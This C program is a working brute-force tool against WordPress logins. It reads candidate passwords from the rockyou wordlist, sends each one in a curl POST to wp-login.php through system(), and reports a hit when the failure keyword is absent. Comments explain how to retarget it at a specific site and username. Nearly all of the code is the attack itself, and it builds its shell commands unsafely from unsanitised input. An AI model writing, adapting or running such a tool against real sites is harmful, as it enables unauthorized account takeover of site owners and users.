#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <time.h>

long long t0; // time-measuring functions
void markTime() {
    struct timeval tv;

    gettimeofday (&tv, NULL);
    t0 = 1000LL * tv.tv_sec + tv.tv_usec / 1000;
}

void reportTime(const char *msg) {
    struct timeval tv;

    gettimeofday (&tv, NULL);
    long long t = 1000LL * tv.tv_sec + tv.tv_usec / 1000;
    printf("Trying password %s took %lld ms\n", msg, t - t0);
}

int main(void) {
    FILE *fin = fopen("/usr/share/wordlists/rockyou.txt", "r");
    char *req[2] = {"curl 'http://example.com/wp-login.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://example.com' -H 'Connection: keep-alive' -H 'Referer: http://example.com/wp-login.php' -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'log=USERNAME&pwd=", "&wp-submit=Log+In&redirect_to=http%3A%2F%2Fexample.com%2Fwp-admin%2F&testcookie=1'"};
    // at least "example.com" and "USERNAME" must be changed in the strings above, according to the specific website

    bool found = 0;
    while (!found) {
        char pass[101];
        fscanf(fin, "%s\n", pass); // read password from wordlist
        
        char request[1024] = {'\0'}; // build the command
        strcat(request, req[0]);
        strcat(request, pass);
        
        strcat(request, req[1]);
        strcat(request, " 2> /dev/null | grep incorrect > error.out"); // "incorrect" might have to be changed to another key word that shows upon a failed login attempt
        
        markTime();
        system(request); // run the command
        reportTime(pass);

    if (fgetc(fopen("error.out", "r")) == -1) { // if there is no error
            found = 1;
            printf("Found password! %s\n", pass); // we found the password
        }
    }

    if (!found) // if the wordlist is exhausted
        printf("Password not found :(");

    return 0;
}
